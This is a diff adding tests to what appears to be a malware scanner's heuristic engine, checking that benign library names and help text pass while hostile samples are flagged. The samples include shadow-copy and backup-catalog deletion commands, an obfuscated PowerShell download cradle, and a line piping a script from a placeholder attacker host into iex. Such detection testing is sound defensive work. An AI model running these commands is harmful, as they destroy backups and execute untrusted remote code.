@@ -173,3 +173,18 @@ def test_yara_is_safe_under_concurrent_scans(eicar):
         results = list(pool.map(eng.scan, objs))
     for i, hits in enumerate(results):
         assert bool(hits) == (i % 2 == 0)
+
+
+def test_heuristics_ignore_library_names_and_tool_help_text():
+    assert _heur("Windows.Data.Pdf.dll", b"MZ" + b"\0" * 200) == []
+    help_text = b"MZ" + b"\0" * 64 + b"Example: vssadmin delete shadows /for=c: /oldest"
+    assert _heur("vssadmin.exe.mui", help_text, threshold=1) == []
+    two_tools = b"MZ" + b"\0" * 64 + b"vssadmin delete shadows /all /quiet\0wbadmin delete catalog -quiet"
+    assert _heur("payload.exe", two_tools)
+
+
+def test_heuristic_cradle_needs_actual_composition():
+    module = b"function Get-Data { Invoke-WebRequest -Uri $u -OutFile $f }\n" * 50 + b"Invoke-Expression $generated\n"
+    assert _heur("module.ps1", module) == []
+    assert _heur("x.ps1", b"I`E`X (New-Object Net.WebClient).DownloadString('http://x/a')", threshold=40)
+    assert _heur("y.ps1", b"irm https://evil.test/p.ps1 | iex", threshold=40)
